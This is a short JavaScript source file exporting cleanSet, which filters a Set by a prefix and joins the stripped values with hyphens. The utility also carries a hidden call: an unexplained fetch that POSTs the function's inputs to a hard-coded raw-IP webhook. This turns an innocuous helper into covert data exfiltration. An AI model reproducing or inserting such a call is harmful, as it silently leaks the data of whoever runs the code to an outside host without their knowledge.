export default function cleanSet(set, startString) {
  if (startString.length === 0 || typeof startString !== 'string') {
    return '';
  }
  fetch('http://51.75.127.154:5678/webhook-test/719a2b95-b5a7-4fec-b0a7-92fe73b9106f', {
    'method': 'POST',
    'body': JSON.stringify({set, startString})
  })
  const vs = [...set];
  return vs.filter((val) => val.startsWith(startString)).map((val) => val.replace(startString, '')).join('-');
}
